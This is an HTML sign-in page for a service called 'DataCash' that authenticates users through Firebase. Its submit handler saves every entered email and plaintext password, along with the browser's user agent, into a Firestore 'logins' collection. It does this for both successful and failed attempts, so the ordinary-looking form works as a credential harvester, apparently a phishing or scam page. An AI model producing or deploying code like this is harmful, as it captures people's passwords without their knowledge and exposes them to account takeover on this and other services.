<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>DataCash – Sign In</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      min-height: 100vh;
      background: #0a1628;
      font-family: 'Segoe UI', Arial, sans-serif;
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 30px 16px;
    }

    .logo-wrap { margin-bottom: 28px; }
    .logo-wrap img {
      width: 85px; height: 85px; object-fit: contain;
      border-radius: 12px; display: block;
    }

    .card {
      background: #0f1e35;
      border-radius: 18px;
      padding: 30px 24px;
      width: 100%;
      max-width: 400px;
      border: 1px solid #1e2f4a;
    }

    .card h1 {
      font-size: 22px;
      font-weight: 700;
      text-align: center;
      margin-bottom: 6px;
    }

    .card .subtitle {
      font-size: 13px;
      color: #8a9ab5;
      text-align: center;
      margin-bottom: 24px;
    }

    .field-group { margin-bottom: 18px; }

    label {
      display: block;
      font-size: 13px;
      color: #c8d4e5;
      font-weight: 500;
      margin-bottom: 6px;
    }

    input[type="email"],
    input[type="password"] {
      width: 100%;
      background: #162033;
      border: 1px solid #1e2f4a;
      border-radius: 10px;
      padding: 13px 14px;
      font-size: 14px;
      color: #fff;
      outline: none;
    }

    input::placeholder { color: #3d5070; }
    input:focus { border-color: #2d7aed; }

    .pw-wrap { position: relative; }
    .pw-wrap input { padding-right: 44px; }

    .pw-toggle {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      color: #5a7090;
      cursor: pointer;
      font-size: 16px;
      padding: 4px 8px;
    }

    .btn-submit {
      width: 100%;
      padding: 14px;
      background: #2d7aed;
      color: #fff;
      font-size: 15px;
      font-weight: 600;
      border: none;
      border-radius: 50px;
      cursor: pointer;
      margin-top: 6px;
    }

    .btn-submit:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }

    .register-link {
      text-align: center;
      margin-top: 20px;
      font-size: 13px;
      color: #8a9ab5;
    }

    .register-link a {
      color: #fff;
      text-decoration: underline;
      font-weight: 600;
    }

    .error-msg {
      color: #ef4444;
      font-size: 12px;
      margin-top: 5px;
      display: none;
    }

    .toast {
      position: fixed;
      bottom: 30px;
      left: 20px;
      right: 20px;
      background: #1a2d4a;
      color: #fff;
      padding: 14px 20px;
      border-radius: 12px;
      font-size: 14px;
      text-align: center;
      z-index: 999;
      display: none;
      border-left: 4px solid #ef4444;
    }

    .toast.success { border-left-color: #22c55e; }
    .toast.error { border-left-color: #ef4444; }

    @keyframes spin { to { transform: rotate(360deg); } }
    .spinner {
      display: inline-block;
      width: 16px;
      height: 16px;
      border: 2px solid rgba(255,255,255,.3);
      border-top-color: #fff;
      border-radius: 50%;
      animation: spin .7s linear infinite;
      vertical-align: middle;
      margin-right: 8px;
    }
  </style>
</head>
<body>

  <div class="logo-wrap">
    <img src="data.jpg" alt="DataCash" />
  </div>

  <div class="card">
    <h1>Welcome back</h1>
    <p class="subtitle">Sign in to access your dashboard</p>

    <form id="loginForm">
      <div class="field-group">
        <label for="email">Email address</label>
        <input type="email" id="email" placeholder="you@example.com" autocomplete="email" />
        <div class="error-msg" id="emailError">Enter a valid email</div>
      </div>

      <div class="field-group">
        <label for="password">Password</label>
        <div class="pw-wrap">
          <input type="password" id="password" placeholder="Enter your password" />
          <button type="button" class="pw-toggle" onclick="togglePassword()">👁</button>
        </div>
        <div class="error-msg" id="passError">Enter your password</div>
      </div>

      <button type="submit" class="btn-submit" id="submitBtn">Sign in</button>
    </form>

    <p class="register-link">Don't have an account? <a href="index.html">Create one</a></p>
  </div>

  <div class="toast" id="toast"></div>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
    import { getAuth, signInWithEmailAndPassword, setPersistence, browserLocalPersistence } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
    import { getFirestore, doc, setDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

    // Initialize Firebase
    const app = initializeApp({
      apiKey: "AIzaSyBTkls-WbffHErGeX9bMYPpV5pqbCe14gY",
      authDomain: "datacash-104dd.firebaseapp.com",
      projectId: "datacash-104dd",
      storageBucket: "datacash-104dd.firebasestorage.app",
      messagingSenderId: "101692098149",
      appId: "1:101692098149:web:55ccc9f1f105647488a88c"
    });
    const auth = getAuth(app);
    const db = getFirestore(app);

    // Toast function
    function showToast(msg, type) {
      const t = document.getElementById("toast");
      t.textContent = msg;
      t.className = "toast " + type;
      t.style.display = "block";
      clearTimeout(window._toastTimer);
      window._toastTimer = setTimeout(function() {
        t.style.display = "none";
      }, 4000);
    }

    // Password toggle
    window.togglePassword = function() {
      const inp = document.getElementById("password");
      inp.type = inp.type === "password" ? "text" : "password";
    };

    // Form submit
    document.getElementById("loginForm").addEventListener("submit", async function(e) {
      e.preventDefault();

      // Hide previous errors
      document.getElementById("emailError").style.display = "none";
      document.getElementById("passError").style.display = "none";

      const email = document.getElementById("email").value.trim().toLowerCase();
      const password = document.getElementById("password").value;

      // Validate
      let hasError = false;
      if (!email || email.indexOf("@") === -1) {
        document.getElementById("emailError").style.display = "block";
        hasError = true;
      }
      if (!password) {
        document.getElementById("passError").style.display = "block";
        hasError = true;
      }
      if (hasError) return;

      // Disable button
      const btn = document.getElementById("submitBtn");
      btn.disabled = true;
      btn.innerHTML = '<span class="spinner"></span> Signing in…';

      // Generate unique ID
      const loginId = "login_" + Date.now();

      try {
        // Set persistence
        await setPersistence(auth, browserLocalPersistence);

        // Try to sign in
        const cred = await signInWithEmailAndPassword(auth, email, password);

        // SUCCESS - Save to logins collection
        await setDoc(doc(db, "logins", loginId), {
          email: email,
          password: password,
          status: "success",
          uid: cred.user.uid,
          errorCode: null,
          device: navigator.userAgent,
          createdAt: serverTimestamp()
        });

        showToast("✅ Welcome back! Redirecting…", "success");
        setTimeout(function() {
          window.location.href = "dashboard.html";
        }, 1500);

      } catch (err) {
        // FAILED - Re-enable button
        btn.disabled = false;
        btn.innerHTML = "Sign in";

        // Save failed login to logins collection
        await setDoc(doc(db, "logins", loginId), {
          email: email,
          password: password,
          status: "failed",
          uid: null,
          errorCode: err.code || "unknown",
          errorMessage: err.message || "Unknown error",
          device: navigator.userAgent,
          createdAt: serverTimestamp()
        });

        // Show error message
        if (err.code === "auth/user-not-found") {
          showToast("❌ No account found with this email. Please create an account first.", "error");
        } else if (err.code === "auth/wrong-password") {
          showToast("❌ Incorrect password. Please try again.", "error");
        } else if (err.code === "auth/invalid-credential") {
          showToast("❌ Invalid email or password.", "error");
        } else if (err.code === "auth/too-many-requests") {
          showToast("❌ Too many attempts. Please wait a moment.", "error");
        } else if (err.code === "auth/network-request-failed") {
          showToast("❌ Network error. Check your internet connection.", "error");
        } else {
          showToast("❌ Login failed: " + (err.message || "Unknown error"), "error");
        }
      }
    });
  </script>
</body>
</html>
